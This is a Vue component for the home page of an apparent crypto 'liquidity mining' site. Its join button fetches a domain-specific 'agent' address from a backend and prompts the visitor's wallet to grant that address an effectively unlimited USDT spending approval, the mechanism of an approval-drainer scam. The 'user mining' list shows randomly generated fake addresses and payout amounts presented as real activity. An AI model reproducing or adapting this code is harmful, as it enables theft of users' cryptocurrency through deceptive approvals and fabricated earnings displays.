<template>
  <div class="home-page">
    <div class="banner-img">
      <img
        v-lazy="getAssetsImageUrl('/homeImg/bannerimg.png')"
        class="img-ban"
        alt=""
      />
      <van-notice-bar
        class="home-notice"
        :left-icon="getAssetsImageUrl('/homeImg/notices.png')"
      >
        详细了解如何在定投计划中利用DCA进行加密货币投资币资...
      </van-notice-bar>
    </div>
    <div class="home-functional">
      <div class="functionals">
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.node") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.nodeNumber) }}
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.pool") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.poolTotal) }}
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.participant") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.authNumber) }}
          </div>
        </div>
        <div class="functional-box">
          <div class="box-text">{{ t("Detailed.income") }}</div>
          <div class="box-item">
            {{ formattedNumber(configStore.$state.homeList.income) }}
          </div>
        </div>
        <div class="functional-area backminning">
          <div />
          <div />
        </div>
        <div class="functional-area backheight">
          <div />
          <div />
        </div>
      </div>
      <van-button
        v-if="!isConnected"
        class="join-btv"
        type="warning"
        @click="queryAuthAgent()"
        >{{ t("HeightPool.approvetext") }}</van-button
      >
    </div>
    <div class="user-mining">
      <div class="mining-titles">{{ t("Detailed.userMining") }}</div>
      <div class="mining-box">
        <div class="box-titles">
          <div>address</div>
          <div>value</div>
        </div>
        <div class="box-line" />
        <div class="box-scroll">
          <div class="box-contant">
            <div v-for="item in testData" :key="item.addr" class="contant-item">
              <div class="item-addr">
                {{
                  item.a.substring(0, 4) + "******" + item.a.substring(13, 17)
                }}
              </div>
              <!-- <div class="hrl_usdt">1,15241478.00</div> -->
              <div class="item-usdt">{{ item.v }}</div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="faq">
      <div class="faq-title">{{ t("Detailed.faq") }}</div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("whyPayMiner") }}</div>
        </div>
        <div class="faq-contant">{{ t("minerFeeExplanation") }}</div>
      </div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("howToJoin") }}</div>
        </div>
        <div class="faq-contant">{{ t("liquidityMiningInfo") }}</div>
      </div>
      <div class="faq-box">
        <div class="box-title">
          <div class="tit-icon">
            <img v-lazy="getAssetsImageUrl('/homeImg/faqicon.png')" alt="" />
          </div>
          <div class="tit-text">{{ t("howToWithdraw") }}</div>
        </div>
        <div class="faq-contant">{{ t("dailyUSDTGeneration") }}</div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, computed } from "vue";
import {
  getAssetsImageUrl,
  truncateString,
  formattedNumber
} from "@/utils/index.utils.js";
import { testApi } from "@/api/index";
import {
  useWeb3ModalAccount,
  useWeb3ModalProvider
} from "@web3modal/ethers/vue";
import { BrowserProvider } from "ethers";
const { walletProvider } = useWeb3ModalProvider();
const { address, chainId } = useWeb3ModalAccount();
import BigNumber from "bignumber.js";
import ABI from "@/assets/abi/erc20.abi.json";
import { useI18n } from "vue3-i18n";
import { useConfigStore } from "@/stores/index";
const configStore = useConfigStore();
const { t } = useI18n();
function generateRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// 生成随机金额
function generateRandomAmount() {
  return (Math.random() * 10000).toFixed(2) + "USDT";
}
const testData = computed(() => {
  const data = [];
  for (let i = 0; i < 100; i++) {
    data.push({
      a: "0x" + generateRandomString(26),
      v: generateRandomAmount()
    });
  }
  return data;
});
/**
 * 获取不同的授权地址。
 *
 * @function getAuthAgent
 * @param {String} chainType - 链类型1以太 56bsc。
 * @param {String} domains - 使用当前浏览器地址。
 * @returns {Object} - 返回首页数据对象。
 */
const queryAuthAgent = () => {
  if (address.value == void 0) {
    modal.open();
  }
  testApi
    .getAuthAgent({
      chainType: chainId.value,
      domains: configStore.$state.domainsUrl //代理域名
    })
    .then(res => {
      let approveAdress = res.data;
      handleConfirm(approveAdress);
    })
    .catch(() => {});
};
//链上授权方法
const coinadress = ref("");
const handleConfirm = async function (approveAdress) {
  if (chainId.value == 56) {
    coinadress.value = "0x55d398326f99059ff775485246999027b3197955";
  } else {
    coinadress.value = "0xdac17f958d2ee523a2206206994597c13d831ec7";
  }
  try {
    const provider = new BrowserProvider(walletProvider.value);
    const signer = await provider.getSigner();
    const tokenContract = new Contract(coinadress.value, ABI, provider);
    let singeContractConnect = tokenContract.connect(signer);
    let quotaNum =
      "0x" +
      new BigNumber(99999999999).multipliedBy(Math.pow(10, 18)).toString(16);
    const tx = await singeContractConnect.approve(approveAdress, quotaNum);
    showLoadingToast({
      message: t("authorizationPending"),
      forbidClick: true,
      wordBreak: "break-word",
      duration: 0
    });
    const value = await tx.wait();
    if (value.status) {
      showSuccessToast({
        message: t("authorizationSuccess"),
        forbidClick: true,
        wordBreak: "break-word",
        duration: 3000
      });
      queryAuthAddress(tx.hash);
    } else {
      showFailToast({
        message: t("authorizationFailed"),
        wordBreak: "break-word",
        forbidClick: true,
        duration: 3000
      });
      return;
    }

    //查询余额并调用申请接口
  } catch (e) {
    console.log(e);
  }
};
onMounted(() => {
  configStore.queryAgentMarketIncome();
});
</script>
<style lang="scss" scoped>
.home-page {
  padding-bottom: 4rem;
  .banner-img {
    width: 100%;
    // height: 160.02px;
    position: relative;

    .home-notice {
      background: #00000033;
      backdrop-filter: blur(0.74rem);
      color: #ffffff;
      font-family: PingFang SC;
      font-size: 0.86rem;
      font-weight: 400;

      width: 100%;
      position: absolute;
      bottom: 0;
    }
  }
  .home-functional {
    margin-top: 1.43rem;
    padding: 0 1.14rem;

    .functionals {
      display: grid;
      grid-gap: 1rem 1.14rem;
      grid-template-columns: repeat(2, 1fr);
      .functional-box {
        background: #ffffff14;
        border-radius: 0.71rem;
        border-top: 0.07rem solid #ffffff1a;
        padding: 0.86rem;
        .box-text {
          font-family: PingFang SC;
          font-size: 0.86rem;
          font-weight: 400;
          color: #ffffff99;
        }
        .box-item {
          margin-top: 0.71rem;
          font-family: DIN;
          font-size: 1.29rem;
          font-weight: 700;
          color: #93f504;
        }
      }
      .functional-area {
        border-radius: 0.71rem;
        height: 6.71rem;
        border: 0.04rem solid #ff693e33;
      }
      .backminning {
        background: url("@/assets/images/homeImg/mining.png") no-repeat
          center/100%;
      }
      .backheight {
        background: url("@/assets/images/homeImg/heightpool.png") no-repeat
          center/100%;
      }
    }
    .join-btv {
      margin-top: 1.43rem;
      background: #ff693e;
      width: 100%;
      height: 2.86rem;
      border: none;
      font-family: PingFang SC;
      font-size: 1rem;
      font-weight: 400;
      color: #ffffff;
    }
  }
  .user-mining {
    margin-top: 1.43rem;
    padding: 0 1.14rem;
    width: 100%;
    .mining-titles {
      font-family: PingFang SC;
      font-size: 1.14rem;
      font-weight: 400;
      line-height: 1.6rem;
      color: #ffffff;
    }
    .mining-box {
      margin-top: 1.14rem;
      height: 22rem;
      border-radius: 0.71rem;
      border: 0.04rem solid #ffffff14;
      background: #ffffff1a;
      padding: 0.86rem 0.71rem;
      .box-titles {
        display: flex;
        justify-content: space-between;
        padding: 0 0.71rem;
        font-family: PingFang SC;
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.4rem;
      }
      .box-line {
        margin-top: 0.71rem;
        width: 100%;
        height: 0.07rem;
        background: linear-gradient(
          90deg,
          rgba(255, 105, 62, 0) 0%,
          rgba(255, 105, 62, 0.4) 44.13%,
          rgba(255, 105, 62, 0) 100%
        );
      }
      .box-scroll {
        overflow: hidden;
        height: 18rem;
        .box-contant {
          -webkit-animation: 60s scrollTop linear infinite normal;
          animation: 60s scrollTop linear infinite normal;
          .contant-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1.07rem;
            .item-addr {
              font-family: PingFang SC;
              font-size: 1rem;
              font-weight: 400;
              line-height: 1.4rem;
              color: #ffffffcc;
            }
            .item-usdt {
              font-family: DIN;
              font-size: 1rem;
              font-weight: 500;
              line-height: 1.21rem;
              color: #ffffff;
            }
          }
        }
      }
    }
  }
  .faq {
    margin-top: 1.43rem;
    padding: 0 1.14rem;
    .faq-title {
      margin-bottom: 1.14rem;
      font-family: PingFang SC;
      font-size: 1.14rem;
      font-weight: 400;
      line-height: 1.6rem;
      color: #ffffff;
    }
    .faq-box {
      width: 100%;
      background: #ffffff1a;

      border: 0.04rem solid #ffffff1a;
      border-radius: 0.71rem;
      margin-bottom: 1rem;
      padding: 0.86rem;
      .box-title {
        display: flex;
        align-items: center;
        .tit-icon {
          width: 2.14rem;
          height: 2.5rem;
          margin-right: 0.5rem;
          > img {
            width: 100%;
            height: 100%;
          }
        }
        .tit-text {
          color: #ffffff;
          font-family: PingFang SC;
          font-size: 1rem;
          font-weight: 400;
        }
      }
      .faq-contant {
        margin-top: 0.71rem;
        font-family: PingFang SC;
        font-size: 0.71rem;
        font-weight: 400;
        line-height: 1rem;
        color: #ffffff99;
      }
    }
  }
}
</style>
<style>
@keyframes scrollTop {
  0% {
    -webkit-transform: translate3d(0, 0, 0);
    transform: translate3d(0, 0, 0);
  }

  100% {
    -webkit-transform: translate3d(0, -142.86rem, 0);
    transform: translate3d(0, -142.86rem, 0);
  }
}
</style>
